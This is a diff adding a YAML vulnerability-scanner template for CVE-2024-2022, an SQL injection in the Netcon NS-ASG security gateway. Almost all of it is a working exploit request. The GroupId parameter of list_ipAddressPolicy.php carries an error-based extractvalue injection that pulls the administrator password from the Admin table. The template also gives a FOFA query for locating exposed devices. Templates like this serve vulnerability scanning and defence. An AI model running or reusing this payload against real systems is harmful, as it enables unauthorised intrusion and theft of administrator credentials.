@@ -1,0 +1,30 @@
+id: poc-yaml-ns-asg-list-ipaddresspolicy-php-sqli
+
+info:
+  name: "网康NS-ASG应用安全网关 list_ipAddressPolicy.php SQL注入漏洞 (CVE-2024-2022)"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2024-2022,sqli
+  metadata:
+    finger: ns-asg
+    fofa: title="网康-NS-ASG-应用安全网关"
+
+variables:
+  t1: "{{rand_int(1000, 9999)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /admin/list_ipAddressPolicy.php?GroupId=1%20and%20extractvalue(0x1,%20concat(0x1,%20(select%20concat(md5({{t1}}),%200x7e,%20passwd)%20from%20Admin%20limit%201))) HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+          - "XPATH syntax error"
+        part: body
